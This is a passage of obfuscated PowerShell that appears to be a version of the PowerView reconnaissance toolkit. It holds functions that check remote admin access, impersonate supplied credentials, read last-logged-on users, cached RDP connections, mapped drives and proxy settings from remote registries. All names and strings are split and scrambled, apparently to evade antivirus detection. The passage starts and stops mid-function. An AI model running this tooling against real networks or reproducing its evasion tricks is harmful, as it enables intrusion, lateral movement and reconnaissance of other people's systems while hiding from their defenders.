                    ${N`ULl} = ${w`TsAp`I32}::("{1}{3}{2}{0}" -f 'ryEx','WT','emo','SFreeM').Invoke(2, ${p`PSesSIon`InFo}, ${Pco`UNT})
                }
                else {
                    &("{0}{2}{1}" -f'W','bose','rite-Ver') "[Get-NetRDPSession] Error: $(([ComponentModel.Win32Exception] $LastError).Message) "
                }
                
                ${NU`Ll} = ${WTSA`PI`32}::("{3}{2}{1}{4}{0}" -f'er','S','SClose','WT','erv').Invoke(${H`AnD`Le})
            }
            else {
                &("{0}{2}{3}{1}{4}"-f 'Writ','rb','e','-Ve','ose') ('[Ge'+'t-Ne'+'t'+'RDPSe'+'s'+'sion'+'] '+'Err'+'or '+'openin'+'g'+' '+'t'+'he '+'Re'+'mo'+'te '+'Des'+'ktop'+' '+'Se'+'s'+'sion '+'Hos'+'t '+'(RD'+' '+'Sessi'+'on'+' '+'Hos'+'t) '+'s'+'e'+'rver '+'for'+': '+"$ComputerName")
            }
        }
    }

    END {
        if (${Log`oNT`okeN}) {
            &("{5}{1}{2}{3}{4}{0}" -f 'elf','oke','-Re','ve','rtToS','Inv') -TokenHandle ${LO`GonTo`kEN}
        }
    }
}


function Te`S`T-ADm`iNaCcE`ss {


    [OutputType({"{0}{3}{2}{1}{4}"-f 'Po','ce','View.AdminAc','wer','ss'})]
    [CmdletBinding()]
    Param(
        [Parameter(pOsITIoN = 0, VALUeFrOMPIPElINe = ${Tr`UE}, VAlUeFrOMpipeLinebyproperTyNaMe = ${t`RuE})]
        [Alias({"{0}{2}{1}" -f 'Ho','tName','s'}, {"{1}{2}{0}"-f'ame','dnshos','tn'}, {"{0}{1}" -f 'n','ame'})]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${CoM`Pu`TEr`Na`ME} = ("{1}{0}{2}"-f'al','loc','host'),

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${c`R`eDenT`Ial} =   ( &("{2}{1}{0}" -f'TEm','HildI','c') ('vaR'+'iAblE'+':JH3x'+'O6'))."vA`Lue"::"EMP`TY"
    )

    BEGIN {
        if (${psBo`UNdp`ARam`e`T`ERs}[("{1}{0}{2}"-f 't','Creden','ial')]) {
            ${Log`Ont`OkEn} = &("{5}{4}{1}{0}{2}{3}"-f 'mpers','UserI','on','ation','-','Invoke') -Credential ${c`ReDEnti`AL}
        }
    }

    PROCESS {
        ForEach (${Co`m`Puter} in ${cOm`P`U`T`eRname}) {
            
            
            ${hand`lE} = ${Ad`VApI`32}::("{4}{0}{3}{2}{1}"-f'enS','rW','anage','CM','Op').Invoke("\\$Computer", ("{1}{3}{0}{2}{4}" -f'vi','Se','c','r','esActive'), 0xF003F);${L`ASTer`RoR} =   (&("{0}{1}" -f'vArIaB','LE')  ("{0}{1}"-f'Xz','NLs') )."vA`LUE"::("{3}{2}{4}{0}{1}"-f '2Err','or','tLastW','Ge','in3').Invoke()

            ${Is`AdMin} = &("{2}{3}{0}{1}"-f 'ec','t','New','-Obj') ("{1}{0}"-f 'ject','PSOb')
            ${Is`A`Dmin} | &("{1}{2}{0}"-f'-Member','Ad','d') ("{1}{0}{2}{3}" -f'oteprop','N','er','ty') ("{0}{2}{3}{1}"-f 'Comp','Name','ut','er') ${c`O`M`PuTer}

            
            if (${HA`NDlE} -ne 0) {
                ${n`UlL} = ${aD`V`APi32}::("{2}{0}{1}{3}" -f 'iceH','an','CloseServ','dle').Invoke(${H`AnDle})
                ${isA`DM`iN} | &("{2}{1}{0}"-f 'er','b','Add-Mem') ("{2}{0}{1}" -f 'e','rty','Noteprop') ("{2}{1}{0}" -f'n','sAdmi','I') ${t`RUE}
            }
            else {
                &("{4}{2}{1}{0}{3}"-f 'bo','e-Ver','rit','se','W') "[Test-AdminAccess] Error: $(([ComponentModel.Win32Exception] $LastError).Message) "
                ${is`AD`Min} | &("{3}{1}{0}{2}" -f 'be','em','r','Add-M') ("{0}{3}{1}{2}"-f 'No','prop','erty','te') ("{1}{0}{2}"-f 'i','IsAdm','n') ${F`ALse}
            }
            ${iSaD`m`In}."P`SoBJEcT"."TyP`enAmEs".("{1}{0}"-f'rt','Inse').Invoke(0, ("{4}{2}{6}{1}{5}{0}{3}"-f 'inAcce','ew.Ad','r','ss','Powe','m','Vi'))
            ${i`SADMIn}
        }
    }

    END {
        if (${l`Og`onTO`keN}) {
            &("{1}{5}{2}{3}{4}{0}"-f 'elf','I','oke-Reve','rtT','oS','nv') -TokenHandle ${LoGoNt`O`k`eN}
        }
    }
}


function g`E`T-n`etcompuTersITeN`AmE {


    [OutputType({"{1}{2}{3}{0}" -f 'te','PowerView.Comput','e','rSi'})]
    [CmdletBinding()]
    Param(
        [Parameter(POSiTiOn = 0, valuEfromPipelINE = ${Tr`UE}, vALuefRompiPELinEbYpROpeRTYNaME = ${t`Rue})]
        [Alias({"{1}{0}" -f'ostName','H'}, {"{2}{1}{0}" -f 'me','shostna','dn'}, {"{1}{0}" -f'ame','n'})]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${cOM`Pu`TernAme} = ("{1}{2}{0}"-f'alhost','l','oc'),

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${creD`eN`TIAL} =   ${Jh`3XO6}::"e`mPty"
    )

    BEGIN {
        if (${Ps`Bo`UN`DPa`RaMetErs}[("{0}{1}{2}"-f'Cred','en','tial')]) {
            ${lOg`onTo`k`eN} = &("{4}{1}{6}{5}{0}{2}{3}" -f 'rImp','oke-','ersonatio','n','Inv','e','Us') -Credential ${C`REd`ent`iAL}
        }
    }

    PROCESS {
        ForEach (${compU`T`Er} in ${comPu`Te`RN`AmE}) {
            
            if (${cOMPu`T`er} -match '^(?:[0-9]{1,3}\.){3}[0-9]{1,3}$') {
                ${ipAd`dre`ss} = ${c`Om`puTeR}
                ${cOMP`U`TeR} =   ${h4`FP}::("{3}{2}{0}{1}" -f 'Ho','stByAddress','t','Ge').Invoke(${C`OM`pUtER}) | &("{3}{2}{1}{0}" -f 'Object','-','ect','Sel') -ExpandProperty ("{0}{1}" -f 'H','ostName')
            }
            else {
                ${i`PaDDRE`ss} = @(&("{4}{0}{1}{2}{3}"-f'so','lv','e-IPAdd','ress','Re') -ComputerName ${C`oMP`UTer})[0]."I`paDdrEss"
            }

            ${pTrI`N`Fo} =   (&("{0}{1}" -f'D','iR')  ("VARiAB"+"l"+"E:9RZq"))."VA`lue"::"ZE`RO"

            ${r`eSulT} = ${nEtA`P`I32}::"d`sgE`Ts`iteNAmE"(${comP`UT`eR}, [ref]${PTRi`N`FO})

            ${C`OMp`UTe`RS`ItE} = &("{0}{2}{1}"-f'New-O','ct','bje') ("{2}{1}{0}" -f'ect','SObj','P')
            ${C`oMpUtERs`I`TE} | &("{2}{1}{0}"-f'r','e','Add-Memb') ("{0}{2}{3}{1}"-f 'Notep','y','rop','ert') ("{3}{2}{1}{0}" -f 'Name','puter','om','C') ${comP`Ut`ER}
            ${CoMpUT`Er`siTe} | &("{2}{0}{1}"-f 'dd-Membe','r','A') ("{3}{2}{0}{1}"-f 't','eproperty','o','N') ("{1}{2}{0}{3}" -f'd','IP','Ad','ress') ${i`p`ADDResS}

            if (${ResU`Lt} -eq 0) {
                ${sIT`En`A`mE} =   ( &("{2}{1}{0}"-f 'RIaBle','a','V')  ("{1}{0}"-f 'lB','T')  -VaLueOnly  )::("{3}{2}{0}{1}"-f'Au','to','ng','PtrToStri').Invoke(${pTR`In`FO})
                ${c`omPuT`er`s`itE} | &("{1}{2}{0}" -f 'r','Add-','Membe') ("{0}{2}{1}{3}" -f 'Notepro','rt','pe','y') ("{0}{1}" -f 'Si','teName') ${s`Ite`N`Ame}
            }
            else {
                &("{0}{3}{2}{1}"-f 'Writ','se','Verbo','e-') "[Get-NetComputerSiteName] Error: $(([ComponentModel.Win32Exception] $Result).Message) "
                ${CO`m`pUTER`S`itE} | &("{3}{1}{0}{2}" -f'd-Me','d','mber','A') ("{3}{2}{1}{0}" -f'y','ropert','ep','Not') ("{0}{2}{1}"-f'Si','eName','t') ''
            }
            ${coMpu`T`E`RSI`TE}."pso`BJE`CT"."TypE`NAM`eS".("{0}{1}"-f 'Ins','ert').Invoke(0, ("{5}{6}{1}{2}{0}{4}{3}" -f 'ter','.Co','mpu','te','Si','PowerVi','ew'))

            
            ${n`ULl} = ${nEt`Ap`i32}::("{4}{0}{3}{1}{2}" -f'e','ff','erFree','tApiBu','N').Invoke(${P`T`RINfO})

            ${COMPute`R`siTE}
        }
    }

    END {
        if (${Lo`GOn`Tok`en}) {
            &("{1}{2}{0}{3}" -f'rtTo','Invoke-','Reve','Self') -TokenHandle ${l`O`GONT`okEn}
        }
    }
}


function G`Et-`wMire`GproXY {


    [OutputType({"{2}{3}{4}{0}{1}"-f'xy','Settings','PowerV','iew.Pr','o'})]
    [CmdletBinding()]
    Param(
        [Parameter(POSitioN = 0, valUEfroMPiPEliNE = ${tR`Ue}, vALueFromPiPeLinEByPRoPerTYNamE = ${tR`UE})]
        [Alias({"{0}{1}"-f'H','ostName'}, {"{1}{0}{3}{2}" -f 'nshos','d','ame','tn'}, {"{0}{1}" -f'na','me'})]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${cOmpUTe`Rn`AmE} = ${e`Nv:Compu`T`ernamE},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${cR`eDE`NtiAL} =   (  &("{0}{1}"-f 'vaR','IaBlE')  ("JH"+"3"+"xO6"))."vA`LUE"::"e`Mpty"
    )

    PROCESS {
        ForEach (${COm`pu`Ter} in ${CO`mPutern`A`Me}) {
            try {
                ${wMiar`g`UmE`NtS} = @{
                    ("{1}{0}" -f'ist','L') = ${tR`UE}
                    ("{1}{0}"-f 'ss','Cla') = ("{3}{2}{1}{0}" -f'Prov','Reg','d','St')
                    ("{1}{0}" -f'e','Namespac') = ((("{3}{2}{1}{0}{4}"-f 'au','tvPVdef','oo','r','lt'))  -cREpLaCE'vPV',[chAR]92)
                    ("{1}{0}{2}" -f 'put','Com','ername') = ${cOmpU`T`eR}
                    ("{1}{2}{0}"-f 'n','Erro','rActio') = ("{1}{0}"-f'op','St')
                }
                if (${PsBO`U`N`dPa`RAMETERS}[("{0}{2}{1}" -f'Credenti','l','a')]) { ${w`M`I`ARGuMENTs}[("{2}{0}{1}"-f'edentia','l','Cr')] = ${crE`D`ENTIal} }

                ${Re`GPr`o`ViDeR} = &("{1}{2}{0}"-f 'ct','Get','-WmiObje') @WmiArguments
                ${K`Ey} = ((("{16}{14}{18}{4}{6}{15}{2}{12}{9}{13}{11}{10}{5}{17}{0}{19}{8}{7}{1}{3}" -f 'S','g','oft','s','{0','n{','}Mic','tin','t','ndow','ersio','CurrentV','{0}Wi','s{0}','TWA','ros','SOF','0}Internet ','RE','e')) -f  [chAr]92)

                
                ${H`kcU} = 2147483649
                ${P`RO`xYS`ERVER} = ${reGpr`O`Vid`er}.("{3}{1}{0}{2}" -f'ingVa','tStr','lue','Ge').Invoke(${Hk`Cu}, ${k`ey}, ("{1}{2}{0}"-f'ver','Prox','ySer'))."sV`AL`Ue"
                ${A`UTocO`NFIGu`Rl} = ${rEgPr`ovID`eR}.("{0}{3}{1}{2}"-f'GetStrin','Val','ue','g').Invoke(${HK`CU}, ${K`EY}, ("{0}{1}{4}{3}{2}" -f'Au','to','igURL','f','Con'))."S`ValuE"

                ${w`pAD} = ''
                if (${aUt`O`ConFiG`Url} -and (${AuTO`COn`F`IGURl} -ne '')) {
                    try {
                        ${W`pad} = (&("{2}{0}{1}"-f 'je','ct','New-Ob') ("{0}{1}{4}{3}{2}"-f'Net','.W','nt','ie','ebCl')).("{0}{2}{1}{3}"-f'Dow','adStrin','nlo','g').Invoke(${AutOCoNf`Ig`URL})
                    }
                    catch {
                        &("{4}{1}{0}{2}{3}" -f 'i','r','t','e-Warning','W') ('[Get-WMIR'+'egPro'+'xy'+'] '+'Err'+'or '+'c'+'onne'+'cti'+'ng '+'to'+' '+'Auto'+'Confi'+'g'+'U'+'RL '+': '+"$AutoConfigURL")
                    }
                }

                if (${p`RO`xYsErvEr} -or ${AuTOC`OnFig`U`Rl}) {
                    ${o`UT} = &("{2}{0}{1}"-f 'b','ject','New-O') ("{1}{0}{2}"-f 'S','P','Object')
                    ${O`UT} | &("{2}{1}{0}{3}"-f'M','-','Add','ember') ("{0}{3}{1}{2}" -f 'No','prope','rty','te') ("{1}{2}{0}"-f'uterName','C','omp') ${COMp`U`Ter}
                    ${o`UT} | &("{1}{0}{2}" -f '-M','Add','ember') ("{1}{0}{2}" -f 'pert','Notepro','y') ("{0}{1}{2}"-f'P','roxy','Server') ${Pro`XYSeRV`Er}
                    ${O`UT} | &("{2}{1}{0}" -f'er','b','Add-Mem') ("{0}{3}{2}{1}"-f 'No','y','pert','tepro') ("{1}{2}{0}{3}" -f'onfigU','Aut','oC','RL') ${AUToC`Onf`Ig`U`RL}
                    ${O`UT} | &("{2}{1}{0}"-f 'er','emb','Add-M') ("{1}{3}{2}{0}" -f 'y','Notep','t','roper') ("{1}{0}" -f 'd','Wpa') ${w`pad}
                    ${o`Ut}."Pso`BjECt"."TyPEn`AMeS".("{0}{2}{1}"-f 'In','ert','s').Invoke(0, ("{5}{3}{0}{1}{2}{4}"-f'ox','yS','ettin','werView.Pr','gs','Po'))
                    ${O`UT}
                }
                else {
                    &("{1}{2}{0}{3}"-f'ite-','W','r','Warning') ('[G'+'et-W'+'MIReg'+'Proxy'+']'+' '+'No'+' '+'p'+'roxy '+'s'+'ettin'+'gs '+'found'+' '+'for'+' '+"$ComputerName")
                }
            }
            catch {
                &("{0}{1}{2}{3}" -f 'Wr','ite-W','ar','ning') ('['+'G'+'et-WMIRegProxy'+'] '+'Error'+' '+'enumera'+'tin'+'g'+' '+'pro'+'x'+'y '+'set'+'tings '+'f'+'or '+"$ComputerName "+': '+"$_")
            }
        }
    }
}


function GeT-w`m`IR`egLAS`TLoGGEdoN {


    [OutputType({"{6}{5}{2}{3}{4}{0}{1}" -f 'OnU','ser','e','rView.Las','tLogged','ow','P'})]
    [CmdletBinding()]
    Param(
        [Parameter(posITiOn = 0, valueFrOMpipelIne = ${Tr`UE}, vALUEFrOmpipElineByprOPeRtynAME = ${t`RUE})]
        [Alias({"{2}{1}{0}" -f'ame','N','Host'}, {"{1}{2}{0}"-f'name','dnsh','ost'}, {"{1}{0}" -f'me','na'})]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${COMP`U`TeR`NaME} = ("{2}{0}{1}" -f'ocalho','st','l'),

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${cr`eden`T`ial} =  ${jH`3XO6}::"em`pTy"
    )

    PROCESS {
        ForEach (${Comp`UtER} in ${CoM`P`UTErn`AMe}) {
            
            ${hK`lM} = 2147483650

            ${wMiA`R`GUmentS} = @{
                ("{1}{0}" -f'ist','L') = ${T`RUe}
                ("{0}{1}"-f'Cl','ass') = ("{0}{1}{2}"-f 'StdR','eg','Prov')
                ("{1}{0}" -f'space','Name') = ((("{0}{1}" -f'rootpAY','default')) -crEPlAce([cHAr]112+[cHAr]65+[cHAr]89),[cHAr]92)
                ("{2}{0}{1}" -f 'omputernam','e','C') = ${cOm`p`UtER}
                ("{2}{0}{3}{1}" -f 'ror','tion','Er','Ac') = ("{0}{4}{3}{1}{2}"-f'S','tlyConti','nue','n','ile')
            }
            if (${P`SbouNd`pAraM`ET`Ers}[("{0}{1}{2}" -f 'Cr','ed','ential')]) { ${Wmi`A`RgumenTS}[("{0}{3}{1}{2}"-f'Cred','ti','al','en')] = ${cr`eDenTI`Al} }

            
            try {
                ${r`eG} = &("{3}{0}{1}{2}" -f'et-Wm','iObj','ect','G') @WmiArguments

                ${K`EY} = ((("{7}{6}{10}{14}{8}{11}{4}{1}{12}{5}{2}{9}{0}{13}{3}"-f'Auth','0}','n','cation{0}LogonUI','Windows{','entVersio','TWARE{0','SOF','ft{','{0}','}','0}','Curr','enti','Microso'))  -f[CHar]92)
                ${VaL`UE} = ("{3}{0}{1}{2}"-f 'o','ggedOn','User','LastL')
                ${l`AsTu`SEr} = ${r`eG}.("{0}{2}{1}"-f 'Ge','ngValue','tStri').Invoke(${h`Klm}, ${K`Ey}, ${va`L`Ue})."Sv`A`LUE"

                ${LaST`logg`Ed`On} = &("{0}{2}{1}" -f 'New-Ob','t','jec') ("{1}{0}" -f'ject','PSOb')
                ${lA`STL`OggE`dOn} | &("{1}{0}{2}" -f'mbe','Add-Me','r') ("{1}{2}{0}"-f 'perty','N','otepro') ("{0}{2}{3}{1}"-f 'C','rName','om','pute') ${C`OmP`UT`er}
                ${L`A`sTlo`gGE`dOn} | &("{2}{0}{1}"-f 'd-M','ember','Ad') ("{2}{3}{1}{0}"-f 'operty','epr','N','ot') ("{1}{2}{0}" -f 'gedOn','La','stLog') ${LaST`Us`ER}
                ${LA`ST`LOg`Ged`oN}."pso`BjE`ct"."tYp`ENA`MEs".("{1}{0}{2}" -f'n','I','sert').Invoke(0, ("{2}{3}{6}{5}{4}{0}{1}"-f 'oggedOnUs','er','Power','Vie','stL','La','w.'))
                ${last`L`o`GGeD`oN}
            }
            catch {
                &("{2}{1}{3}{4}{0}" -f'rning','it','Wr','e','-Wa') ('[Ge'+'t'+'-WMIRegL'+'astL'+'o'+'gge'+'dOn] '+'Er'+'r'+'or '+'o'+'peni'+'ng '+'re'+'m'+'ote '+'regist'+'ry'+' '+'o'+'n '+"$Computer. "+'Re'+'m'+'ote '+'regist'+'ry'+' '+'l'+'ike'+'ly '+'no'+'t '+'ena'+'ble'+'d.')
            }
        }
    }
}


function GET-wMIRe`GcA`Ch`eDrD`P`conne`CTI`On {


    [OutputType({"{6}{7}{4}{0}{5}{1}{2}{3}"-f 'a','h','edRDPConnect','ion','.C','c','P','owerView'})]
    [CmdletBinding()]
    Param(
        [Parameter(POsITiON = 0, VaLUEFromPIpELINE = ${tr`UE}, ValUefrOMPIpeLiNebyProperTYNAmE = ${T`RUE})]
        [Alias({"{1}{2}{0}" -f'e','Host','Nam'}, {"{0}{2}{1}"-f 'dnsh','me','ostna'}, {"{0}{1}"-f'na','me'})]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${C`Om`puT`ER`NAME} = ("{1}{0}" -f 'ost','localh'),

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${cRe`De`NTiAl} =   ( &("{1}{2}{0}" -f 'le','Va','riab') ("{1}{0}" -f '3XO6','jH')  )."VaL`Ue"::"E`MPTY"
    )

    PROCESS {
        ForEach (${cOmp`UT`er} in ${CoMp`Ut`ErNA`me}) {
            
            ${h`Ku} = 2147483651

            ${WmiaRguM`En`TS} = @{
                ("{1}{0}" -f 't','Lis') = ${t`Rue}
                ("{0}{1}" -f'C','lass') = ("{0}{1}{2}" -f 'Std','RegP','rov')
                ("{1}{0}{2}" -f'espa','Nam','ce') = ((("{0}{1}{2}"-f'root{','0','}default'))  -f[cHaR]92)
                ("{2}{1}{0}"-f'name','omputer','C') = ${Com`PU`TER}
                ("{2}{0}{1}"-f'ct','ion','ErrorA') = ("{1}{0}" -f'p','Sto')
            }
            if (${P`SBou`NDPaR`AmeTerS}[("{2}{1}{3}{0}" -f'tial','r','C','eden')]) { ${wMiaRG`UmEn`TS}[("{2}{0}{1}" -f 'reden','tial','C')] = ${CRe`d`EntI`AL} }

            try {
                ${R`eg} = &("{2}{1}{0}{3}" -f'Wm','-','Get','iObject') @WmiArguments

                
                ${Us`Er`S`IdS} = (${R`eg}.("{0}{1}" -f'En','umKey').Invoke(${H`ku}, ''))."SnAm`Es" | &("{1}{0}{2}{3}" -f 'h','W','e','re-Object') { ${_} -match (('S'+'-1-5'+'-21-'+'['+'0'+'-9'+']+-'+'[0'+'-9'+']+-'+'[0-'+'9]+-'+'[0-9]+TQe').("{0}{2}{1}"-f 'Re','acE','PL').Invoke('TQe','$')) }

                ForEach (${u`S`ERsID} in ${u`seRS`IdS}) {
                    try {
                        if (${psbO`Un`DpArA`mETe`Rs}[("{2}{0}{1}" -f'dent','ial','Cre')]) {
                            ${UsE`R`NA`me} = &("{1}{2}{3}{0}" -f'ertFrom-SID','Co','n','v') -ObjectSid ${us`eRS`ID} -Credential ${cR`ED`enT`IAL}
                        }
                        else {
                            ${use`R`NAMe} = &("{2}{0}{1}"-f'nvertFr','om-SID','Co') -ObjectSid ${uSE`R`SiD}
                        }

                        
                        ${Co`N`NECtIOn`kE`yS} = ${R`Eg}.("{2}{0}{1}"-f 'n','umValues','E').Invoke(${h`Ku},("$UserSID\Software\Microsoft\Terminal "+'Se'+'rver'+' '+('Client{0}D'+'ef'+'aul'+'t')  -F  [ChAr]92))."sNa`m`Es"

                        ForEach (${CoN`N`ec`TIOn} in ${C`onnEctIO`N`keys}) {
                            
                            if (${C`O`N`NECTIOn} -match ("{0}{1}"-f 'MRU','.*')) {
                                ${TA`RgE`T`SeRVER} = ${r`eg}.("{2}{3}{1}{0}"-f 'e','u','GetStringVa','l').Invoke(${H`Ku}, ("$UserSID\Software\Microsoft\Terminal "+'Se'+'r'+'ver '+('C'+'l'+'ient{0}D'+'efault')  -f[chAR]92), ${Co`NnEc`Ti`oN})."sV`AluE"

                                ${FO`UnD`c`o`NNEcTion} = &("{1}{2}{0}" -f 'w-Object','N','e') ("{1}{0}{2}" -f'SObjec','P','t')
                                ${FoUNd`C`ONNec`Tion} | &("{2}{0}{1}" -f'-Mem','ber','Add') ("{1}{2}{0}" -f 'ty','Noteprope','r') ("{2}{0}{1}" -f 'uterNa','me','Comp') ${COm`PUt`Er}
                                ${F`oUNdCOn`Ne`c`TIon} | &("{0}{1}{2}{3}" -f 'Add-','M','embe','r') ("{2}{3}{0}{1}" -f'eproper','ty','N','ot') ("{0}{1}"-f 'User','Name') ${U`s`ErNAmE}
                                ${F`oUN`dcONN`e`Cti`ON} | &("{0}{2}{1}" -f 'Add-Me','ber','m') ("{1}{3}{0}{2}" -f 'ep','No','roperty','t') ("{1}{2}{0}"-f 'ID','U','serS') ${usERS`ID}
                                ${fou`NDc`ONNECtI`oN} | &("{0}{2}{1}"-f 'Add-','ber','Mem') ("{2}{0}{1}{3}" -f 't','epr','No','operty') ("{3}{2}{0}{1}" -f 'Se','rver','get','Tar') ${targe`TsERV`ER}
                                ${fo`UnDCo`N`Necti`oN} | &("{1}{2}{0}" -f'er','Add','-Memb') ("{2}{1}{0}"-f 'ty','er','Noteprop') ("{1}{2}{0}"-f 'nt','Us','ernameHi') ${NU`LL}
                                ${FoUnDCONNe`c`TIoN}."psObJ`E`cT"."t`yp`EnAmes".("{1}{0}" -f 'nsert','I').Invoke(0, ("{4}{1}{3}{5}{0}{2}" -f 'c','werView.Cached','tion','RDP','Po','Conne'))
                                ${FOu`NdconnEcTi`on}
                            }
                        }

                        
                        ${Se`RVERke`Ys} = ${R`eG}.("{1}{0}"-f 'ey','EnumK').Invoke(${H`kU},("$UserSID\Software\Microsoft\Terminal "+'Ser'+'ver '+('C'+'l'+'ien'+'tbslServ'+'ers').("{2}{1}{0}"-f'E','EpLaC','r').Invoke('bsl','\')))."sNa`MEs"

                        ForEach (${SER`V`er} in ${sERveRK`e`Ys}) {

                            ${u`sErn`AmehiNT} = ${R`eG}.("{1}{2}{0}" -f 'gValue','GetSt','rin').Invoke(${h`kU}, ("$UserSID\Software\Microsoft\Terminal "+'S'+'erv'+'er '+"Client\Servers\$Server"), ("{0}{1}{2}{3}" -f'Us','er','nameHin','t'))."sVA`lUE"

                            ${f`o`U`NDc`onneCtION} = &("{0}{2}{1}"-f'New-Obj','t','ec') ("{0}{1}{2}"-f 'P','SObje','ct')
                            ${fou`N`dCONnECTi`on} | &("{0}{2}{1}" -f 'Ad','ber','d-Mem') ("{1}{0}{2}" -f'eprope','Not','rty') ("{1}{0}{2}"-f 'uterNa','Comp','me') ${cO`Mp`UTER}
                            ${F`o`UNdConnE`CT`iOn} | &("{2}{0}{1}" -f 'e','r','Add-Memb') ("{1}{0}{2}" -f'oteprope','N','rty') ("{0}{1}" -f 'U','serName') ${U`sERna`Me}
                            ${FoU`Nd`COnnE`Cti`on} | &("{1}{0}{2}" -f 'e','Add-Memb','r') ("{2}{1}{0}"-f'y','tepropert','No') ("{0}{1}" -f 'UserSI','D') ${U`ser`siD}
                            ${f`ounD`cOnNE`C`Tion} | &("{1}{2}{0}" -f'r','A','dd-Membe') ("{2}{3}{1}{0}"-f'y','opert','No','tepr') ("{0}{3}{2}{1}" -f'T','ver','rgetSer','a') ${SE`RVer}
                            ${FOUNdc`o`NN`ec`TiOn} | &("{1}{2}{3}{0}" -f 'ber','Ad','d-Me','m') ("{3}{0}{1}{2}"-f'o','teprop','erty','N') ("{1}{2}{0}"-f'eHint','Us','ernam') ${USeRna`mE`HINT}
                            ${FOund`C`OnN`eCtiON}."P`S`object"."TYp`ENa`meS".("{1}{0}"-f 'ert','Ins').Invoke(0, ("{2}{6}{7}{5}{1}{3}{4}{8}{0}" -f 'ion','RDPC','P','o','nnec','ached','owerVie','w.C','t'))
                            ${FOUNDC`on`NEC`T`Ion}
                        }
                    }
                    catch {
                        &("{0}{2}{1}" -f'Write','e','-Verbos') ('[G'+'e'+'t-'+'WMIRe'+'gCached'+'RD'+'PConnect'+'io'+'n] '+'Err'+'or: '+"$_")
                    }
                }
            }
            catch {
                &("{0}{4}{3}{1}{2}"-f'Writ','n','g','rni','e-Wa') ('[G'+'et'+'-'+'W'+'MI'+'Re'+'gCa'+'ched'+'RDPC'+'onnection] '+'Er'+'r'+'or '+'acce'+'ssi'+'n'+'g '+"$Computer, "+'likely'+' '+'ins'+'uf'+'ficient'+' '+'perm'+'ission'+'s '+'or'+' '+'firewa'+'ll '+'rules'+' '+'o'+'n '+'host'+': '+"$_")
            }
        }
    }
}


function ge`T-wm`IrEGmO`UN`TeDDr`i`Ve {


    [OutputType({"{7}{1}{6}{3}{0}{2}{5}{4}"-f 'te','R','dD','oun','ive','r','egM','PowerView.'})]
    [CmdletBinding()]
    Param(
        [Parameter(pOSITion = 0, VAluEfRomPiPELIne = ${Tr`Ue}, ValUefRompIPelINeBYpROpErTynaME = ${T`RUE})]
        [Alias({"{0}{2}{1}" -f'H','ame','ostN'}, {"{1}{0}{2}"-f'shostnam','dn','e'}, {"{0}{1}" -f 'nam','e'})]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${C`ompU`T`eRnaMe} = ("{1}{0}{2}"-f 'hos','local','t'),

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${c`R`EdenTial} =   ${jh`3`Xo6}::"E`mPTy"
    )

    PROCESS {
        ForEach (${c`oMPU`TEr} in ${C`OmpUt`eRNa`me}) {
            
            ${H`Ku} = 2147483651

            ${WMIa`RgUmen`Ts} = @{
                ("{0}{1}" -f'Lis','t') = ${t`Rue}
                ("{0}{1}"-f'Cl','ass') = ("{1}{2}{0}" -f 'v','Std','RegPro')
                ("{1}{0}"-f 'ace','Namesp') = ((("{1}{2}{3}{0}{4}"-f 't{0}','r','o','o','default'))-F  [cHaR]92)
                ("{3}{2}{1}{0}"-f'e','ernam','omput','C') = ${cOmPU`Ter}
                ("{1}{2}{0}"-f'tion','Err','orAc') = ("{0}{1}"-f 'St','op')
            }
            if (${p`SBoun`DPA`RAmet`E`RS}[("{0}{1}{2}" -f'Cr','eden','tial')]) { ${WmiA`R`g`UME`NTS}[("{2}{1}{0}" -f'al','nti','Crede')] = ${crEDEn`Ti`AL} }

            try {
                ${r`EG} = &("{2}{1}{0}" -f 't','iObjec','Get-Wm') @WmiArguments

                
                ${usE`RSIdS} = (${R`Eg}.("{0}{2}{1}"-f'E','Key','num').Invoke(${H`ku}, ''))."S`N`Ames" | &("{2}{3}{1}{0}" -f 't','c','Where','-Obje') { ${_} -match (('S-1-5-21'+'-[0-9]'+'+'+'-['+'0-'+'9'+']'+'+-[0-9]'+'+'+'-[0-9]'+'+{0}')  -F [CHAr]36) }

                ForEach (${u`S`erSid} in ${usErsi`Ds}) {
                    try {
                        if (${p`SB`Ou`ND`PAR`AMeTErs}[("{2}{0}{1}"-f 'r','edential','C')]) {
                            ${uS`erNAme} = &("{0}{4}{1}{2}{3}"-f'Conve','m','-','SID','rtFro') -ObjectSid ${useR`S`id} -Credential ${CrED`eN`TIal}
                        }
                        else {
                            ${use`RN`AMe} = &("{3}{1}{0}{4}{2}"-f 'vertFr','n','D','Co','om-SI') -ObjectSid ${U`s`ErSID}
                        }

                        ${drI`Ve`L`E`Tters} = (${R`eg}.("{2}{0}{1}"-f 'umK','ey','En').Invoke(${h`kU}, "$UserSID\Network"))."SNA`MEs"

                        ForEach (${drIve`l`eT`TER} in ${driVelET`T`eRS}) {
                            ${PR`Ov`I`deRna`ME} = ${r`EG}.("{0}{1}{2}" -f 'G','etString','Value').Invoke(${h`Ku}, "$UserSID\Network\$DriveLetter", ("{2}{1}{0}{3}" -f'derNa','i','Prov','me'))."S`VAL`UE"
                            ${R`E`MOTepATh} = ${r`eg}.("{4}{0}{1}{3}{2}"-f'e','t','tringValue','S','G').Invoke(${H`KU}, "$UserSID\Network\$DriveLetter", ("{1}{0}{2}"-f'oteP','Rem','ath'))."Sva`l`UE"
                            ${D`R`i`VEUserNAmE} = ${r`eg}.("{2}{1}{3}{0}"-f 'ingValue','t','Ge','Str').Invoke(${h`Ku}, "$UserSID\Network\$DriveLetter", ("{1}{0}" -f'rName','Use'))."s`VA`LuE"
                            if (-not ${US`ErnA`Me}) { ${uS`erN`AME} = '' }

                            if (${Re`mot`EPATH} -and (${r`EMote`PAth} -ne '')) {
                                ${M`OuNtEDdrI`VE} = &("{0}{2}{1}"-f 'New-Ob','ct','je') ("{1}{0}" -f'ect','PSObj')
